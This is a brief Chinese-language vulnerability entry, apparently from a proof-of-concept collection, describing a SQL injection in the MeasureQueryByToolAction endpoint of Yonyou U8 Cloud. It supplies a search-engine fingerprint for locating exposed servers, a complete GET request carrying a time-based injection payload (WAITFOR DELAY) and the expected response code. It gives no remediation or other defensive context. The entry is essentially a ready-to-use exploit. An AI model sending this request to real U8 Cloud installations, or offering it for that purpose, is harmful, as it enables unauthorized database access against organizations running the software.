# 用友U8CloudMeasureQueryByToolActionSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryByToolAction&method=execute&query_id=1%27);WAITFOR+DELAY+%270:0:5%27--+ HTTP/1.1`
- **响应特征**：200